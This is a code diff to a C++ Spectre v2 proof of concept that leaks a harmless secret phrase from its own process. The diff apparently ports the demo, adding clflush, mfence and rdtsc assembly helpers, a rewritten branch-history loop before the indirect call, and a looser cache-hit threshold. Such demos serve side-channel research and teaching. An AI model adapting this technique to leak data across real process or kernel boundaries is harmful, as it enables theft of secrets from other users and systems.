@@ -2,23 +2,39 @@
  *  Program uses spectre v2 to read its own memory.
  */
 
-#pragma GCC push_options
-#pragma GCC optimize ("O0")
+#pragma clang optimize off
 
 #include <stdio.h>
-#include "types.h"
-#include "user.h"
-
 #include <cstring>
 #include <stdlib.h>
-#include "amd64.h"
+#include "sysstubs.h"
+
+
 
 #define CACHE_HIT_THRESHOLD 80
 #define GAP 1024
 
+static inline void clflush(volatile void *p)
+{
+  __asm volatile("clflush (%0)" :: "r" (p));
+}
+
+static inline void mfence()
+{
+  __asm volatile("mfence");
+}
+
+static inline uint64_t
+rdtsc(void)
+{
+  uint32_t hi, lo;
+  __asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
+  return ((uint64_t)lo)|(((uint64_t)hi)<<32);
+}
+
 u8 *channel; // side channel to extract secret phrase
 u64 *target; // pointer to indirect call target
-char *secretPhrase = "The Magic Words are Please and Thank You.";
+char *secretPhrase = "The Magic Words are Please and Thank You.\0\0\0";
 const int secretPhraseLen = 42;
 
 // mistrained target of indirect call
@@ -42,21 +58,18 @@ __attribute__((noinline))
 int
 user_victim(volatile char *addr, volatile int input) // addr will be passed to user_gadget via %rdi
 {
-  int junk = 0;
-  // set up bhb by performing >29 taken branches
-  // junk and input used to guarantee the loop is actually run
-  for (int i = 1; i <= 100; i++) {
-    input += i;
-    junk += input & i;
-  }
-
   int result;
-  __asm volatile("callq *%1\n"
-                 "mov %%eax, %0\n"
-                 : "=r" (result)
-                 : "r" (*target)
-                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
-  return result & junk;
+  __asm volatile("dummy_victim_start:\n"
+                 "   mov $0, %%rdx\n"
+                 "1: cmp $0x64, %%rdx\n"
+                 "   jle 2f\n"
+                 "   jmp 4f\n"
+                 "2: jmp 3f\n"
+                 "3: add $0x1, %%rdx\n"
+                 "4: call *%1\n"
+                 "   movl %%eax, %0\n"
+                 : "=r" (result) : "r" (*target): "rdx");
+  return result;
 }
 
 // see appendix C of https://spectreattack.com/spectre.pdf
@@ -125,7 +138,7 @@ readByte(volatile char *addrToRead, char result[2])
     }
   }
 
-  if ((hits[j] >= 2 * hits[k] + 5) ||
+  if ((hits[j] >= 2 * hits[k] + 2) ||
       (hits[j] == 2 && hits[k] == 0)) {
     result[0] = (char) j;
     result[1] = 1;
@@ -157,11 +170,11 @@ main(int argc, char *argv[])
     } else {
       printf("?");
     }
+    fflush(stdout);
     index++;
   }
-  printf("\ndone! (junk = %d)\n", junk); // prevent junk from being optimized out
 
+  printf("\n");
+  fprintf(fopen("/dev/null", "w"), "%d", junk); // prevent junk from being optimized out
   return 0;
 }
-
-#pragma GCC pop_options
